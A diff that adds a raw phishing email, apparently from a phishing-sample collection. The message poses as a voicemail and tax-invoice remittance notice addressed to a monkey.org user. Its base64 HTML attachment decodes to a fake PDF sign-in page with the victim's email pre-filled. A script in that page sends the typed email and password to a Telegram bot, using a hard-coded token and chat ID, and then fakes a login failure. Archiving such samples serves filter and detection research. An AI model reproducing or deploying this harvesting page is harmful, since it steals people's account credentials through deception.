@@ -1,0 +1,272 @@
+From jose@monkey.org Tue Oct 29 15:44:40 2024 +0000
+Return-Path: hope@cefilni.com
+Delivered-To: jose@monkey.org
+X-FDA: 82727061648.06.7ED2617
+Received: from terry.cefilni.com (terry.cefilni.com [193.25.216.247])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 06C2C1A0005
+	for <jose@monkey.org>; Tue, 29 Oct 2024 15:44:18 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=pass header.d=cefilni.com header.s=dkim header.b=ImP00raY;
+	dmarc=pass (policy=none) header.from=cefilni.com;
+	spf=pass (imf27.b.hostedemail.com: domain of hope@cefilni.com designates 193.25.216.247 as permitted sender) smtp.mailfrom=hope@cefilni.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1730216609;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=nxXU5sU38lek9nx7Bj+7+QrGHTz6oI9zaZhbkQu5Hso=;
+	b=dsDRiubI7TRS+JwP9WLmXyxakF8YMt/Ele8PhPNnKD7hVN/OZbQ9WvUz2LSuzU/z7Hlpqa
+	BP17bs5z8q+JU30xxIQCDJOhpJWX/B9CdEGUt/9aY4CzlAX0JkIObDnkv/5Xzwix7DrsDQ
+	0pChRyAvjG0lK+ORVX0oE05bjy2/oPc=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730216609; a=rsa-sha256;
+	cv=none;
+	b=FFzzCy7KaAWfFr2U6wYnnQIdjj7z9AYxbsJ5FOW0PcbZgxgntRWI2ZVvpM2iUNzQJnWLI1
+	lqg9UsM1YzXJBy6JfwZF1K++bp48F8DYe9h1dubEwDdyRsVnoPG3KjnV4RyfI/cOrwWJ/j
+	L0zo1VthXq0jzan8o1+hVxgIZiMHrU0=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=pass header.d=cefilni.com header.s=dkim header.b=ImP00raY;
+	dmarc=pass (policy=none) header.from=cefilni.com;
+	spf=pass (imf27.b.hostedemail.com: domain of hope@cefilni.com designates 193.25.216.247 as permitted sender) smtp.mailfrom=hope@cefilni.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=cefilni.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=hope@cefilni.com;
+ bh=ExUNimjGkKnkursgcbmIfHcOUzE=;
+ b=ImP00raYHolDH5ju9qj0PI8Mf/LaRrgGcdG3xjYfJS8gEPBbtroyYpj0C+L1vXWq94vCSXPTazv6
+   4VFh20DdYxm6GggBFiG2xT9KuONBPursMZNw2FErv/ldn2ArngBMnQ/8ApY+ItIijgR1WEQF7Gss
+   d/cpPQwvCFCBnRHHgb4f4pbS7ekmEMBx3sKwDRt+7xhCTEYuJSx6p1tbEikC8KSyKUU5B/FoZk9q
+   QYG5REG4+SF3ac4ywKWoyijDHtWpGil1VzH2YI2+/3sCzjhyqfYp9JwV1RBojDRRmDNTLNNSbmcL
+   sM4O+iEFvhHYhaDcph/gPeUucADLfA6nqc0kbA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=cefilni.com;
+ b=eLjgNbSt+a8w0a+NOSsz/XYprPLHe1321sXYldmTmds7UgmCz7gLjMSzkv8KHXLaNSgjm1D2BauV
+   WgGsC5q4/QvDNmTOpHWwkBPoXByYSNxEvV29h2A8UG2mmXuMrQ/wyeuJAw+dERMRqGzjxxKrU+3A
+   itka4iMJAK9P4FgL6BRaXgvF+qtKiPhX4O9AqfW1PJGV1bjGsRG+6J0kT5JydeO2tE7WGn94mAS7
+   CIIRNCIDRLOxAkBpLQtvrG0EMBfVsWmpoaMdpAiny6spaJshaB9c7AfCRvyYxFVWbriKaOhiusU/
+   h3ovfZFnLVv7pSofCpEASGdtswg/pa1Ujgnf7Q==;
+From: "Accs Payable AED9218"<hope@cefilni.com>
+To: jose@monkey.org
+Subject: RE: Tax Invoice, remittance notice FYI.
+Date: 29 Oct 2024 12:35:30 +0000
+Message-ID: <20241029123530.8CD15F22B8B84A43@cefilni.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_13346ADA.48E8D5C5"
+X-Rspamd-Server: rspam05
+X-Spam-Status: No, score=5.30
+X-Stat-Signature: y9awi6w4kcwaffpyuw6xmb1rwm7r69hu
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 06C2C1A0005
+X-HE-Tag: 1730216658-960677
+X-HE-Meta: U2FsdGVkX18fJMKrJloiECwBFKLZzx5g1q6CzIER3jDM+TH1T5Tsnhtr+HbLLPKOPjSHMqq2rnUHWbIm97sBz+AHYcH8WUuW/HqismEiA0gexaXbMXI/gbRbg/4mhfzkncX1GHXs+nZt1J2aFBP/7e8mAOxBkyYB3U+FAHtoP2RoWONjnp0LwcSTvJToAQaH5GZQWLOOHyRDKfhfcMS/D77jEejq2tcrbaVALV2rMboHgvIkM/Go3+eboeazAmD/z/OnGuWh6GanmwYGOAbkFzEsHpdo3GbFDgXOtwI05jCq6jsLZPgHRb9RypAdUz5PfaNJhDD+iSY0LJvc3cwto7NuzxE7ZVP/7XXYWt7KDmE0z3uesw3aOYKJq7dHYyI1Us7IwVj9rCUdRs75ph7hcVTrYvHvXw6vBfOBVZ/DTuZuW3/NJDa0wG03F2L37iDI1J3b3wSrFtbMSoLeqEh9wdFesM2ybxtNVOuFHA/8xFz6s8q39w4AYSOamTDBYDMHRHFEdLu4pLno566Eogy+y8GScG/gZwoLgSkN1/WUDeuGDLnm3oJRZYDBrZVh9XogEmfHzDXHa4w33NXOX6Ua8f3TlAPaOzzEehCDqoEdYwth7JIXOaXoFyJBiXJFnIe3jLy+RK0WgLuU3zOPB/uEfLB+oXtE/tF8F9Ro+HcEO0co7mMZd+M+d7aBs4WBU1lPb6g0utQ9KpJQ6JFUasnA76kzeGFujvSMdANnIj8MBRF9noR8rfDy43MBMjDG68ej9fPMcxJ46def36uRR9OAkDy9w4oiPdkmBjoTC8AGSkj97HCjNTwds1kqsCiENvTmUH+9S5Sj7l+Kwp2yJ8TuRGjryctvryDrY499Fn/04RM+dGJYAECa1uDlmrB4gz8iSlFvqeZjAB1RGvXRCGEx7octhlKiIweplw74zPAIclts+C2Mqv7GXaa2Gaq5i9BxhP1m4mRtdYAV1N4SHS50khnJZFu
+ wYnW7icjBBFTQOEc8lVckmvRjRCoRuXPnTZecoPXRjiEpn5SL8DHh5pS0Q//1OVPxwJq8DbMEdnjzePXhOs3/3ZnbKu5C3sEgn+ovhvsXTtz6AU0npzkjEC0KdSz7yqeJo6gYWgWS6ckag5pxcWefeHXpMl0SGzH3soJ9iBmCzI/HzL8I5wwa7iQa1xjkEivwZIiMbZNa22FbAHJfgQqbKf+9WlGhNzFIi//PAan+FCzTEaObiWUOkLfpbM1GVWr9ea5PrtdySKhNUwn4/541QaoKuA==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 319
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_13346ADA.48E8D5C5
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html lang=3D"en"><head>
+    <meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title>Voice Message Notification</title>
+    <style>
+        body {
+             font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+             background-color: #ffffff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+             text-align: center;
+            margin-bottom: 20px;
+        }
+        .message {
+            font-size: 16px;
+            line-height: 1.5;
+             margin-bottom: 20px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777777;
+         }
+    </style>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px">
+    <div style=3D"background-color: #ffffff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1)" class=3D"container">=
+
+<strong>        </strong><div style=3D"text-align: center;
+            margin-bottom: 20px" class=3D"header"><strong>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font size=3D"3"><font size=3D"5">monkey.org=
+ Voicemail Notification</font><br>You have received a new voice message<br>=
+From: Accounts Payable Team<br>Title: Remittace advice (Payment Inquiry).<b=
+r>Duration:&nbsp;01 minutes ; 39 seconds<br></font></strong></div><div styl=
+e=3D"font-size: 16px;
+            line-height: 1.5;
+             margin-bottom: 20px" class=3D"message"><strong>
+            </strong><p>
+<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-seri=
+f; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; di=
+splay: inline !important; white-space: normal; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To listen to the message, Please&nbs=
+p;find&nbsp;Attached|Download&nbsp;and open with browser to play&nbsp;Voice=
+mail.</span><br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;
+=20=20=20=20=20=20=20=20=20
+=20=20=20=20=20=20=20=20
+            <strong><font size=3D"1">Powered by monkey.org Voice Messaging =
+2024,Thank you for using our service!</font></strong></p></div>
+=20=20=20=20=20=20=20=20
+    </div>
+
+</body></html>
+------=_NextPart_000_0012_13346ADA.48E8D5C5
+Content-Type: text/html; name="TaxInvRemittanceMessagePDF.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="TaxInvRemittanceMessagePDF.html"
+
+PGh0bWw+PGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRl
+bnQ9IklFPWVkZ2UiPg0KPC9oZWFkPg0KPGJvZHk+DQogICAgPHN0eWxlPg0KICAgICAgICBi
+b2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly9pLnNz
+dGF0aWMubmV0L3Z6YnVRLmpwZyIpOw0KICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBj
+b3ZlcjsNCiAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAg
+ICAgICAgICBoZWlnaHQ6IDEwMHZoOw0KICAgICAgICAgICAgbWFyZ2luOiAwOw0KICAgICAg
+ICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2Vu
+dGVyOw0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgfQ0KDQog
+ICAgICAgIC5sb2dpbi1mb3JtIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOw0K
+ICAgICAgICAgICAgcGFkZGluZzogMjBweDsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6
+IDEwcHg7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMTBweCByZ2JhKDAsIDAsIDAs
+IDAuMSk7DQogICAgICAgIH0NCg0KICAgICAgICBpbnB1dCB7DQogICAgICAgICAgICB3aWR0
+aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7DQogICAgICAgICAgICBtYXJn
+aW46IDVweCAwOw0KICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsNCiAgICAg
+ICAgICAgIGJvcmRlci1yYWRpdXM6IDVweDsNCiAgICAgICAgfQ0KDQogICAgICAgIGJ1dHRv
+biB7DQogICAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDEw
+cHg7DQogICAgICAgICAgICBtYXJnaW46IDEwcHggMDsNCiAgICAgICAgICAgIGJhY2tncm91
+bmQ6ICMwMDdiZmY7DQogICAgICAgICAgICBjb2xvcjogd2hpdGU7DQogICAgICAgICAgICBi
+b3JkZXI6IG5vbmU7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7DQogICAgICAg
+ICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgICAgIH0NCiAgICA8L3N0eWxlPg0KPG1ldGEg
+aHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCg0KDQog
+PGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxzdHJvbmc+ICAgIDwvc3Ryb25nPjxkaXYgY2xh
+c3M9ImxvZ2luLWZvcm0iPjxzdHJvbmc+DQo8aW1nIHdpZHRoPSI1IiBoZWlnaHQ9IjUiIHN0
+eWxlPSJ3aWR0aDogMTUwcHg7IGhlaWdodDogMzJweDsiIHNyYz0iaHR0cHM6Ly9pLnBpbmlt
+Zy5jb20vNzM2eC8wOS84MS82YS8wOTgxNmFhMzk2MWViYzk4MjE4YTYwZjJmYjQ1MGNlZi5q
+cGciPjwvc3Ryb25nPjxoMT48c3BhbiBzdHlsZT0nZm9udC1mYW1pbHk6ICJDYWxpYnJpIExp
+Z2h0IjsnPg0KPHNwYW4gc3R5bGU9J2NvbG9yOiByZ2IoMjcsIDI3LCAyNyk7IHRleHQtdHJh
+bnNmb3JtOiBub25lOyB0ZXh0LWluZGVudDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFs
+OyBmb250LWZhbWlseTogIlNlZ29lIFVJIiwgLWFwcGxlLXN5c3RlbSwgIkhlbHZldGljYSBO
+ZXVlIiwgIkx1Y2lkYSBHcmFuZGUiLCBSb2JvdG8sIEVicmltYSwgIk5pcm1hbGEgVUkiLCBH
+YWR1Z2ksICJTZWdvZSBYYm94IFN5bWJvbCIsICJTZWdvZSBVSSBTeW1ib2wiLCAiTWVpcnlv
+IFVJIiwgIktobWVyIFVJIiwgVHVuZ2EsICJMYW8gVUkiLCBSYWF2aSwgIklza29vbGEgUG90
+YSIsIExhdGhhLCBMZWVsYXdhZGVlLCAiTWljcm9zb2Z0IFlhSGVpIFVJIiwgIk1pY3Jvc29m
+dCBKaGVuZ0hlaSBVSSIsICJNYWxndW4gR290aGljIiwgIkVzdHJhbmdlbG8gRWRlc3NhIiwg
+Ik1pY3Jvc29mdCBIaW1hbGF5YSIsICJNaWNyb3NvZnQgTmV3IFRhaSBMdWUiLCAiTWljcm9z
+b2Z0IFBoYWdzUGEiLCANCiJNaWNyb3NvZnQgVGFpIExlIiwgIk1pY3Jvc29mdCBZaSBCYWl0
+aSIsICJNb25nb2xpYW4gQmFpdGkiLCAiTVYgQm9saSIsICJNeWFubWFyIFRleHQiLCAiQ2Ft
+YnJpYSBNYXRoIjsgZm9udC1zaXplOiAyNHB4OyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA2MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9uZTsgZGlzcGxheTog
+aW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6IDI7IHdp
+ZG93czogMjsgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI1NSwgMjU1LCAyNTUpOyBmb250LXZh
+cmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13
+ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRoaWNrbmVz
+czogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29y
+YXRpb24tY29sb3I6IGluaXRpYWw7Jz4NClNpZ24gaW48L3NwYW4+PC9zcGFuPg0KJm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7
+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PHNwYW4gc3R5bGU9
+J2NvbG9yOiByZ2IoMCwgMCwgMCk7IHRleHQtdHJhbnNmb3JtOiBub25lOyB0ZXh0LWluZGVu
+dDogMHB4OyBsZXR0ZXItc3BhY2luZzogbm9ybWFsOyBmb250LWZhbWlseTogIlRpbWVzIE5l
+dyBSb21hbiI7IGZvbnQtc2l6ZTogbWVkaXVtOyBmb250LXN0eWxlOiBub3JtYWw7IGZvbnQt
+d2VpZ2h0OiA0MDA7IHdvcmQtc3BhY2luZzogMHB4OyBmbG9hdDogbm9uZTsgZGlzcGxheTog
+aW5saW5lICFpbXBvcnRhbnQ7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6IDI7IHdp
+ZG93czogDQoyOyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMjU1LCAyNTUsIDI1NSk7IGZvbnQt
+dmFyaWFudC1saWdhdHVyZXM6IG5vcm1hbDsgZm9udC12YXJpYW50LWNhcHM6IG5vcm1hbDsg
+LXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29yYXRpb24tdGhpY2tu
+ZXNzOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tc3R5bGU6IGluaXRpYWw7IHRleHQtZGVj
+b3JhdGlvbi1jb2xvcjogaW5pdGlhbDsnPjwvc3Bhbj4NCjxmb3JtIGlkPSJsb2dpbkZvcm0i
+IHN0eWxlPSdjb2xvcjogcmdiKDAsIDAsIDApOyB0ZXh0LXRyYW5zZm9ybTogbm9uZTsgdGV4
+dC1pbmRlbnQ6IDBweDsgbGV0dGVyLXNwYWNpbmc6IG5vcm1hbDsgZm9udC1mYW1pbHk6ICJU
+aW1lcyBOZXcgUm9tYW4iOyBmb250LXNpemU6IG1lZGl1bTsgZm9udC1zdHlsZTogbm9ybWFs
+OyBmb250LXdlaWdodDogNDAwOyB3b3JkLXNwYWNpbmc6IDBweDsgd2hpdGUtc3BhY2U6IG5v
+cm1hbDsgb3JwaGFuczogMjsgd2lkb3dzOiAyOyBmb250LXZhcmlhbnQtbGlnYXR1cmVzOiBu
+b3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13ZWJraXQtdGV4dC1zdHJva2Ut
+d2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRoaWNrbmVzczogaW5pdGlhbDsgdGV4dC1k
+ZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0LWRlY29yYXRpb24tY29sb3I6IGluaXRp
+YWw7Jz50byBsaXN0ZW4gdG8gdmlldyBQREYgRG9jdW1lbnQgb25saW5lOjo8YnI+DQo8YnI+
+DQogICAgICAgICAgICA8bGFiZWwgZm9yPSJlbWFpbCI+RW1haWw6PC9sYWJlbD4NCiAgICAg
+ICAgICAgIDxpbnB1dCBuYW1lPSJlbWFpbCIgaWQ9ImVtYWlsIiByZXF1aXJlZD0iIiB0eXBl
+PSJlbWFpbCIgdmFsdWU9Impvc2VAbW9ua2V5Lm9yZyI+PGJyPg0KICAgICAgICAgICAgPGxh
+YmVsIGZvcj0icGFzc3dvcmQiPkVudGVyIFBhc3N3b3JkOjwvbGFiZWw+DQogICAgICAgICAg
+ICA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHJlcXVpcmVkPSIiIHR5cGU9InBhc3N3b3JkIiBw
+bGFjZWhvbGRlcj0iUGFzc3dvcmQiIHZhbHVlPSIiPjxicj48YnV0dG9uIHN0eWxlPSJiYWNr
+Z3JvdW5kOiByZ2IoMCwgMTIzLCAyNTUpOyBtYXJnaW46IDEwcHggMHB4OyBwYWRkaW5nOiAx
+MHB4OyBib3JkZXItcmFkaXVzOiA1cHg7IGJvcmRlcjogY3VycmVudENvbG9yOyBib3JkZXIt
+aW1hZ2U6IG5vbmU7IHdpZHRoOiAzOTcuMzNweDsgaGVpZ2h0OiAzOXB4OyBjb2xvcjogd2hp
+dGU7IHdoaXRlLXNwYWNlOiBub3JtYWw7IGN1cnNvcjogcG9pbnRlcjsgb3JwaGFuczogMjsg
+d2lkb3dzOiAyOyAtd2Via2l0LXRleHQtc3Ryb2tlLXdpZHRoOiAwcHg7IHRleHQtZGVjb3Jh
+dGlvbi10aGlja25lc3M6IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1zdHlsZTogaW5pdGlh
+bDsgdGV4dC1kZWNvcmF0aW9uLWNvbG9yOiBpbml0aWFsOyIgdHlwZT0ic3VibWl0Ij4NClNp
+Z24gaW4gdG8gdmlldyBQREYgZG9jdW1lbnQ8L2J1dHRvbj4NCjxiciBzdHlsZT0nY29sb3I6
+IHJnYigwLCAwLCAwKTsgdGV4dC10cmFuc2Zvcm06IG5vbmU7IHRleHQtaW5kZW50OiAwcHg7
+IGxldHRlci1zcGFjaW5nOiBub3JtYWw7IGZvbnQtZmFtaWx5OiAiVGltZXMgTmV3IFJvbWFu
+IjsgZm9udC1zaXplOiBtZWRpdW07IGZvbnQtc3R5bGU6IG5vcm1hbDsgZm9udC13ZWlnaHQ6
+IDQwMDsgd29yZC1zcGFjaW5nOiAwcHg7IHdoaXRlLXNwYWNlOiBub3JtYWw7IG9ycGhhbnM6
+IDI7IHdpZG93czogMjsgYmFja2dyb3VuZC1jb2xvcjogcmdiKDI1NSwgMjU1LCAyNTUpOyBm
+b250LXZhcmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3Jt
+YWw7IC13ZWJraXQtdGV4dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXRo
+aWNrbmVzczogaW5pdGlhbDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyB0ZXh0
+LWRlY29yYXRpb24tY29sb3I6IGluaXRpYWw7Jz48YnI+PC9mb3JtPjwvaDE+DQogICAgICAg
+IDxwIGlkPSJsb2dpbk1lc3NhZ2UiPjwvcD4NCiAgICA8L2Rpdj4NCg0KICAgIDxzY3JpcHQ+
+DQogICAgICAgIGNvbnN0IGZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5G
+b3JtJyk7DQogICAgICAgIGNvbnN0IGxvZ2luTWVzc2FnZSA9IGRvY3VtZW50LmdldEVsZW1l
+bnRCeUlkKCdsb2dpbk1lc3NhZ2UnKTsNCg0KICAgICAgICBmb3JtLmFkZEV2ZW50TGlzdGVu
+ZXIoJ3N1Ym1pdCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgICAgICAgICBldmVudC5wcmV2
+ZW50RGVmYXVsdCgpOw0KICAgICAgICAgICAgY29uc3QgZW1haWwgPSBmb3JtLmVsZW1lbnRz
+LmVtYWlsLnZhbHVlOw0KICAgICAgICAgICAgY29uc3QgcGFzc3dvcmQgPSBmb3JtLmVsZW1l
+bnRzLnBhc3N3b3JkLnZhbHVlOw0KDQogICAgICAgICAgICBjb25zdCBhcGlLZXkgPSAnNzcw
+MDYzMjg2MTpBQUdHSTRFNTBsbzRCaWJ5OG5HdlhLUXVSc0FMTkZBaFZQOCc7DQogICAgICAg
+ICAgICBjb25zdCBjaGF0SWQgPSAnLTEwMDI0NTQ4OTQxMDcnOw0KDQogICAgICAgICAgICBm
+ZXRjaChgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7YXBpS2V5fS9zZW5kTWVzc2Fn
+ZT9jaGF0X2lkPSR7Y2hhdElkfSZ0ZXh0PUVtYWlsOiAke2VtYWlsfSUwQVBhc3N3b3JkOiAk
+e3Bhc3N3b3JkfWApDQogICAgICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gew0KICAg
+ICAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uub2spIHsNCiAgICAgICAgICAgICAgICAg
+ICAgICAgIGxvZ2luTWVzc2FnZS5pbm5lclRleHQgPSAnTG9naW4gRmFpbGVkOiBQbGVhc2Ug
+Y2hlY2sgaW5wdXQgYW5kIFRyeSBhZ2FpbiEnOw0KICAgICAgICAgICAgICAgICAgICB9IGVs
+c2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgbG9naW5NZXNzYWdlLmlubmVyVGV4dCA9
+ICdMb2dpbiBGYWlsZWQ6IFBsZWFzZSBjaGVjayBpbnB1dCBhbmQgVHJ5IGFnYWluIS4nOw0K
+ICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAg
+ICAgICAuY2F0Y2goZXJyb3IgPT4gew0KICAgICAgICAgICAgICAgICAgICBsb2dpbk1lc3Nh
+Z2UuaW5uZXJUZXh0ID0gJ0FuIGVycm9yIG9jY3VycmVkIHdoaWxlIHRyeWluZy4nOw0KICAg
+ICAgICAgICAgICAgIH0pOw0KICAgICAgICB9KTsNCiAgICA8L3NjcmlwdD4NCg0KDQo8L2Rp
+dj48L2JvZHk+PC9odG1sPg==
+
+------=_NextPart_000_0012_13346ADA.48E8D5C5--
